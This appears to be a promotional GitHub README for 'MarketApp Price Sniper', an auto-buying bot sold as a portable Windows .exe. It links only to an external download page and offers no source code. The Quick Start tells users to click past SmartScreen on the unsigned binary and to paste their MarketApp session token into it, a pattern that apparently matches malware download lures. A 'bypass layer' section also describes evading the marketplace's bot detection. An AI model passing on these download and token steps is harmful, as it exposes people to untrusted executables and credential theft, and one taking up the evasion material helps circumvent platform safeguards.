<div align="center">
<img src="assets/banner.png" width="100%" alt="MarketApp Price Sniper banner" />
</div>

<div align="center">
<p>
  <img src="https://img.shields.io/badge/Platform-Windows_11%7C10-4fe3e3?style=for-the-badge&logo=windows" alt="" />
  <img src="https://img.shields.io/badge/Release-2026-EA580C?style=for-the-badge" alt="" />
  <img src="https://img.shields.io/badge/Build-.exe-DB2777?style=for-the-badge" alt="" />
</p>
</div>

<p align="center">
  <img src="https://readme-typing-svg.herokuapp.com?color=0D9488&size=28&center=true&vCenter=true&width=900&lines=%E2%9C%A8+Price+Sniper+Pro;%E2%AD%90+Ready+for+Windows;%F0%9F%93%A6+Built+for+Windows+11;%F0%9F%92%A1+Active+Development+2026;%F0%9F%94%A7+Standalone+.exe+Release;%E2%9C%85+Updated+for+2026">
</p>

<p align="center">
  <img src="https://skillicons.dev/icons?i=unity" />
  <img src="https://skillicons.dev/icons?i=github" />
  <img src="https://skillicons.dev/icons?i=windows" />
</p>

---

## 🧭 Table of Contents

- [Overview](#-overview)
- [What is MarketApp Price Sniper?](#-what-is-marketapp-price-sniper)
- [The Problem](#-the-problem)
- [The Solution](#-the-solution)
- [Quick Start](#-quick-start)
- [Key Features](#-key-features)
- [Sniper Core Modules](#-sniper-core-modules)
- [Alerting & Notification Stack](#-alerting--notification-stack)
- [Data Feeds & Parser Engine](#-data-feeds--parser-engine)
- [Hotkeys / Controls](#-hotkeys--controls)
- [AI Integration](#-ai-integration)
- [Detection / Bypass Status](#-detection--bypass-status)
- [Compatibility / Platform Support](#-compatibility--platform-support)
- [System Requirements](#-system-requirements)
- [Roadmap / Planned Features](#-roadmap--planned-features)
- [Changelog / Release History](#-changelog--release-history)
- [Known Issues](#-known-issues)
- [FAQ](#-faq)

---

## 📊 Overview

| Category | Details |
|---|---|
| Product name | MarketApp Price Sniper |
| Build type | Portable `.exe` — no installer, no runtime, no dependencies |
| Year | 2026 |
| Module count | 27 sniper modules across 3 stacks |
| Distribution | Landing page → download → extract → run |
| Price model | Free, open-source hobbyist release |

MarketApp Price Sniper is a desktop sniping companion for the MarketApp trading interface. It watches listings, filters them against your buy rules, and fires a purchase request the moment a match appears — no manual refreshing, no tab-switching, no missed flips. Everything runs from a single `.exe` you extract to a folder and double-click.

---

## 🎯 What is MarketApp Price Sniper?

| Term | Explanation |
|---|---|
| Snipe | A purchase request sent at the exact moment a matching listing appears |
| Watchlist | A saved set of item filters (name, float, tier, price ceiling) that the sniper polls against |
| Trigger rule | The AND/OR condition set that decides whether a listing is "worth firing" |
| Feed | A data source the parser reads — listing pages, search endpoints, or the MarketApp event stream |
| Cooldown gate | A per-watchlist rate limit so the sniper doesn't spam-buy duplicates |
| Fill confirmation | The post-purchase acknowledgement the sniper logs to prove the item landed in inventory |
| Bypass layer | The request-shaping module that keeps the sniper's traffic looking like normal browsing |

Why people run it:

- **Speed** — polling fires in the tens of milliseconds, not the seconds a human refresh takes.
- **Consistency** — rules don't get tired, don't blink, and don't miss the 3 a.m. restock.
- **Recoverability** — every trigger is logged with a timestamp so you can audit what it bought and why.
- **Portability** — no install path, no registry writes, no admin prompt; unpack and run.

---

## 🩹 The Problem

- MarketApp listing refreshes are manual, and the good flips vanish in the time it takes to switch tabs.
- A restock drop for a popular item gets eaten by script runners within a couple of seconds — human reflexes lose.
- Filter menus reset on navigation, so you re-enter the same price ceiling and float range dozens of times a session.
- You can't tell *why* a snipe missed — was the price wrong, the rule broken, or the request just slow?
- Multiple watchlists across different item families mean juggling several browser windows and hoping you spot the hit.
- Every refresh you don't do is a listing you never saw, and stale data feeds quietly make you buy off a phantom price.

---

## 🛠 The Solution

| Problem | Solution |
|---|---|
| Manual refresh miss | Core Sniper polls the feed at a configurable interval and fires on match |
| Restock eaten by script runners | Pre-armed triggers plus warm feed connections cut fire latency |
| Filters reset every navigation | Persistent Watchlist Store survives restarts and app updates |
| Unknown miss reasons | Miss-Reason Logger tags each skip (price, float, cooldown, feed lag) |
| Multiple windows juggling | Multi-Watchlist Runner queues dozens of rule sets in one process |
| Stale price data | Feed Health Monitor drops and reopens dead connections automatically |

---

## ⚙️ Quick Start

1. 📥 Visit the project landing page and grab the latest portable archive.
2. 📦 Extract the archive to any folder (Desktop, USB stick, Documents — anywhere writable).
3. ▶️ Double-click the `.exe`. Windows SmartScreen may ask for confirmation — click **More info → Run anyway**.
4. 🔑 On first launch, paste your MarketApp session token into the **Auth** tab, then click **Test Connection**.
5. 🎯 Open the **Watchlists** tab, build your first rule, hit **Arm**, and watch the trigger log for hits.

> First-run tip: leave the default 250 ms poll interval until you've confirmed a few dry-run hits. Dry-run mode logs every would-be trigger without purchasing, which is the fastest way to tune your price ceilings.

---

## ✨ Key Features

| Feature | Description | Benefit |
|---|---|---|
| Rule-based triggers | AND/OR conditions over name, float, wear, price, and listing age | Fire only on the exact items you want |
| Multi-watchlist runner | Run many independent rule sets in one process | One window instead of ten tabs |
| Dry-run mode | Simulates fires without purchasing | Safe tuning before going live |
| Feed health monitor | Detects dead streams and reconnects | No silent data gaps |
| Latency profiler | Times each request and reports p50/p95 | Know your real fire speed |
| Cooldown gates | Per-rule and per-item rate limits | Stops accidental duplicate buys |
| Fill confirmation | Post-purchase inventory check | Proof the snipe landed |
| Trigger audit log | Every fire, skip, and error timestamped | Debug a missed flip in seconds |
| Portable profile | All settings live in a `profile/` folder next to the `.exe` | Copy your setup between machines |
| Headless relay | Optional local HTTP endpoint for external scripts | Hook the sniper into your own tooling |

---
<p align="center">
  <a href="https://WyvernDomain.github.io/price-sniper/">
    <img src="https://img.shields.io/badge/DOWNLOAD_FREE-Win64-7C3AED?style=for-the-badge&labelColor=5B21B6" width="580" alt="DOWNLOAD FREE Win64"/>
  </a>
</p>
---

## 🎯 Sniper Core Modules

**Scheduler & Trigger Engine**
- **Poll Loop** — configurable interval from 100 ms upward; respects server `Retry-After` headers.
- **Trigger Evaluator** — evaluates AND/OR rule trees in one pass, short-circuits on the first false.
- **Fire Queue** — serializes purchase requests so a burst of matches doesn't get you rate-limited.
- **Cooldown Gate** — per-rule, per-item, and global timers that block duplicate buys.
- **Fill Confirmation** — re-reads inventory after purchase and marks the trigger as `filled` or `refunded`.

**Watchlist Management**
- **Rule Builder** — GUI editor for price ceilings, float ranges, wear tiers, and name patterns.
- **Preset Packs** — import/export rule bundles as plain JSON for sharing between machines.
- **Batch Import** — paste a list of item names and auto-generate one rule per line.
- **Rule Versioning** — every edit is snapshotted so you can roll back a broken watchlist.

**Safety & Control**
- **Kill Switch** — global hotkey that disarms every watchlist instantly.
- **Purchase Cap** — hard limit on spend-per-hour and per-day, enforced before each fire.
- **Dry-Run Toggle** — flips the whole process into simulation mode with one checkbox.

---

## 🔔 Alerting & Notification Stack

**Local Alerts**
- **Trigger Toast** — desktop notification with item name, price paid, and rule that matched.
- **Audio Cues** — distinct tones for `filled`, `skipped`, and `rate-limited` events.
- **Tray Indicator** — color-shifts the tray icon when a watchlist is armed and idle.

**Remote Alerts**
- **Webhook Notifier** — POSTs a JSON payload to any endpoint you configure.
- **Discord Bridge** — sends a formatted embed per trigger via a user-supplied webhook URL.
- **Email Digest** — optional batched summary of hits and misses with CSV attachment.

**Logging**
- **Trigger Audit Log** — timestamped JSONL of every fire, skip, and error.
- **Miss-Reason Tagger** — annotates skips (`price`, `float`, `cooldown`, `feed_lag`, `manual`).
- **Session Replay** — records the raw feed frames around each trigger for later inspection.

---

## 📡 Data Feeds & Parser Engine

**Feed Connectors**
- **Search Feed** — reads MarketApp search endpoints with cursor pagination.
- **Stream Feed** — subscribes to the event stream for low-latency listing notices.
- **Snapshot Feed** — periodic full-page scrape as a fallback when streams are degraded.

**Parsing**
- **HTML Normalizer** — extracts listing fields even when the DOM shifts between deploys.
- **Price Sanitizer** — strips currency symbols and locale decimal separators before comparison.
- **Float Parser** — numeric-coerces float values with a tolerance for the `0.00` case.
- **Duplicate Suppressor** — remembers listing IDs across feeds so the same item isn't fired twice.

**Health**
- **Feed Health Monitor** — heartbeat check per feed; auto-reconnect with exponential backoff.
- **Latency Profiler** — p50/p95 request timing per feed in the diagnostics tab.
- **Bypass Layer** — request shaping (headers, jitter, retry policy) so traffic looks normal.

---

## ⌨️ Hotkeys / Controls

| Key | Action | Notes |
|---|---|---|
| `Ctrl+Alt+S` | Arm / disarm the active watchlist | Tray icon flips color on arm |
| `Ctrl+Alt+K` | Global kill switch | Disarms every watchlist immediately |
| `Ctrl+Alt+D` | Toggle dry-run mode | Reflected in the title bar |
| `Ctrl+Alt+L` | Open the trigger audit log | Opens the log side panel |
| `Ctrl+Alt+R` | Refresh all feeds | Forces a full reconnect |
| `F5` | Reload the active watchlist | Re-parses rules from disk |
| `Esc` | Stop the current fire queue | Pending fires are cancelled, not dropped |
| `Ctrl+S` | Save the current rule editor state | Disabled in read-only profiles |

---

## 🤖 AI Integration

MarketApp Price Sniper ships with an optional AI layer that 2026 builds make use of without becoming a black box:

- **Rule Authoring Assist** — describe a watchlist in plain English ("any AK with float under 0.05 and price under 300") and the sniper drafts the rule tree for you to edit.
- **Price Anomaly Flagging** — a small on-device model flags listings priced far below recent median so you can eyeball them before firing.
- **Miss-Pattern Insights** — summarizes the last 500 audit-log entries and surfaces which rule clauses cause the most skips.
- **Float Prediction** — estimates likely float distribution for a given item so you can tighten ceilings without over-filtering.
- **Suggested Cooldowns** — learns your historical rate-limit errors and proposes per-rule cooldown gates.
- **Log Summarizer** — produces a one-paragraph digest of the current session for quick scanning.

Every AI suggestion is a **proposal** — nothing is auto-applied to a live watchlist unless you accept the diff in the rule editor. The model runs locally; no listing data leaves the machine unless you explicitly enable the remote webhook bridge.

---

## 🛡 Detection / Bypass Status

| Method | Status | Notes |
|---|---|---|
| Header fingerprint check | ✅ Covered | Bypass layer rotates `User-Agent`/`Accept-Language` headers per session |
| Rate-limit fingerprint | ✅ Covered | Fire queue paces requests; backoff honors `Retry-After` |
| DOM-shift parser breakage | ✅ Covered | HTML normalizer uses resilient selectors, not brittle paths |
| Stream token rotation | ✅ Covered | Feed connectors re-auth transparently when tokens refresh |
| Request-timing analysis | ⚠️ Partial | Human-ish jitter configurable but not adaptive |
| TLS fingerprint inspection | ❌ Unsupported | The `.exe` uses the platform network stack as-is |
| Behavioral ML checkpoint | ⚠️ Partial | Cooldowns and dry-run mode reduce exposure; no built-in evasion |

---

## 💻 Compatibility / Platform Support

| Platform | Status | Notes |
|---|---|---|
| Windows 11 (x64) | ✅ Tested | Primary target |
| Windows 10 22H2+ (x64) | ✅ Tested | Recommended minimum |
| Windows Server 2022 | ⚠️ Partial | Runs but is not supported |
| Wine / Proton (Linux) | ⚠️ Experimental | Works with `.NET` desktop runtime shims |
| macOS / Apple Silicon | ❌ Unsupported | No native build planned |

MarketApp Price Sniper is a Windows `.exe` first; Linux and macOS users are on their own. The portable build bundles no runtime, so the machine needs the .NET 8 Desktop Runtime installed separately if it's not already present.

---

## 🧾 System Requirements

| Component | Minimum | Recommended |
|---|---|---|
| OS | Windows 10 22H2 (x64) | Windows 11 23H2+ |
| CPU | 2-core x64 @ 2.0 GHz | 4-core x64 @ 2.8 GHz |
| RAM | 4 GB | 8 GB |
| Disk | 150 MB free | 500 MB free (logs grow) |
| Runtime | .NET 8 Desktop Runtime | .NET 8 Desktop Runtime |
| Network | Stable 5 Mbps | Wired 20 Mbps+ |
| Display | 1280×720 | 1920×1080 |
| Admin rights | Not required | Not required |

---

## 🗺 Roadmap / Planned Features

| Feature | Status | ETA |
|---|---|---|
| Adaptive request jitter | In design | Q2 2026 |
| Rule-tree visual debugger | In design | Q2 2026 |
| On-device anomaly model v2 | In progress | Q3 2026 |
| Multi-session relay pool | Planned | Q3 2026 |
| Rule marketplace export format | Planned | Q4 2026 |
| Headless daemon mode (no GUI) | Planned | Q4 2026 |
| Cross-platform GUI shell | Exploring | 2027 |

---

## 📜 Changelog / Release History

| Version | Date | Changes |
|---|---|---|
| 2026.4 | 2026-04-02 | Add Miss-Reason Tagger; fix feed reconnect race on cold start |
| 2026.3 | 2026-03-11 | Roll out AI Rule Authoring Assist; tighten kill-switch hotkey |
| 2026.2 | 2026-02-18 | Persistent watchlist store; latency profiler p95 fix |
| 2026.1 | 2026-01-29 | Portable profile relocation; add headless relay endpoint |
| 2025.12 | 2025-12-12 | Maintenance: parser resilience pass, log rotation cap |

---

## 🐛 Known Issues

| Issue | Fix |
|---|---|
| Fire queue can stall if a stream feed closes mid-request | Toggle `Ctrl+Alt+R` to force reconnect, or restart the `.exe` |
| Dry-run audit log grows unbounded on long sessions | Set the log rotation cap in Settings → Logs |
| Webhook bridge drops payloads on flaky networks | Increase retry count in the Notifier tab |
| Rule editor freezes when loading a >200-rule preset | Split preset into smaller bundles, or wait for the 2026.4 fix |
| SmartScreen warning on first launch | Click **More info → Run anyway** (portable `.exe` is unsigned) |

---

## ❓ FAQ

<details><summary>Is there a fixed executable name I should look for?</summary>

No — the archive ships as a portable `.exe` and the release notes don't pin a filename. Extract the archive and run the `.exe` you find inside it.
</details>

<details><summary>Do I need Python, Node, or a package manager?</summary>

No. There's no install step at all — no `pip`, no `npm`, no runtime wrapper. The `.exe` is self-contained apart from the .NET 8 Desktop Runtime, which most Windows 11 machines already have.
</details>

<details><summary>Does the sniper buy automatically?</summary>

Only if you arm a watchlist and leave the safety gates open. By default the process starts in dry-run mode and fires nothing until you explicitly arm a rule in the GUI.
</details>

<details><summary>Where do my settings live?</summary>

In a `profile/` folder that sits next to the `.exe`. Copy that folder between machines to move your watchlists, cooldowns, and audit logs.
</details>

<details><summary>Can I run several watchlists at once?</summary>

Yes — the Multi-Watchlist Runner queues dozens of independent rule sets in a single process. The fire queue serializes purchases so you don't get rate-limited.
</details>

<details><summary>What happens if a feed drops?</summary>

The Feed Health Monitor detects the missing heartbeat and reconnects with exponential backoff. If a reconnect fails repeatedly, the watchlist it backs is paused and you get a local toast.
</details>

<details><summary>Is the AI layer mandatory?</summary>

No. The AI features are opt-in suggestions you accept or reject in the rule editor. You can run the sniper with the AI layer disabled entirely.
</details>

<details><summary>Does it work on Linux or macOS?</summary>

There's no native build. Wine/Proton on Linux is experimental; macOS Apple Silicon is unsupported.
</details>

<details><summary>Can I get louder alerts than a desktop toast?</summary>

Yes — the Notifier tab supports webhooks, a Discord bridge, and batched email digests in addition to local toasts and audio cues.
</details>

<details><summary>Why does the release archive not include a bundled runtime?</summary>

Because a portable build shouldn't write to the registry or the system drive. Keeping the runtime external is what lets you copy the folder to a USB stick and run from it.
</details>

---

## 🧩 Final Notes

MarketApp Price Sniper exists because the interesting part of a snipe is the rule — the item name, the float ceiling, the price cap — and tedium of clicking refresh shouldn't decide who wins a restock. The build is a single portable `.exe`, the profile is a folder you can back up, and every trigger is logged so you can audit, replay, and tune. If you get value out of it, the best contribution is a clean rule bundle in the presets folder or a well-formed miss-reason report in the issue tracker.
<p align="center">
  <a href="https://WyvernDomain.github.io/price-sniper/">
    <img src="https://img.shields.io/badge/GET-MarketApp_Price_Sniper_2026-9333EA?style=flat-square&logo=download&logoColor=white&labelColor=7E22CE" width="480" alt="GET MarketApp Price Sniper 2026"/>
  </a>
</p>